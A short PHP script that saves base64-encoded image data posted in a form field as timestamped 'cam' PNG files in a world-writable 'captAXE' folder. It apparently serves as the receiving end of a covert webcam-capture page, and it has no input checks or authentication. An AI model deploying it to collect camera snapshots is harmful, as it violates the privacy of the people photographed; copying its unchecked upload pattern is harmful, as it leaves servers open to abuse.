<?php
$targetDirectory = "captAXE";
$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!file_exists($targetDirectory)) {
    mkdir($targetDirectory, 0777, true);
}
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( $targetDirectory . "/" . 'cam'. $date .'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

